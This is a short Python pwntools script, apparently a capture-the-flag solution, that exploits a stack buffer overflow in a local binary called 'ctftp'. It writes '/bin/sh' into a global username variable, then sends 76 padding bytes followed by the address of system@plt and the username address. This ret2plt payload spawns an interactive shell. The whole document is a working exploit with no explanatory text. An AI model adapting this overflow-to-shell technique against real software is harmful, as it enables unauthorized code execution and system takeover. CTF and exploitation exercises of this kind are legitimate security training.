from pwn import *

buffer_size = 76

app = process('./ctftp')
elf = ELF("./ctftp")

system_plt_address = elf.plt['system'] 
username_address = elf.symbols['username']

app.sendlineafter(": ", "/bin/sh\x00")
app.sendlineafter("> ", "2")
app.sendlineafter(": ", buffer_size * 'a' + p32(system_plt_address) + "xxxx" + p32(username_address))

app.interactive() 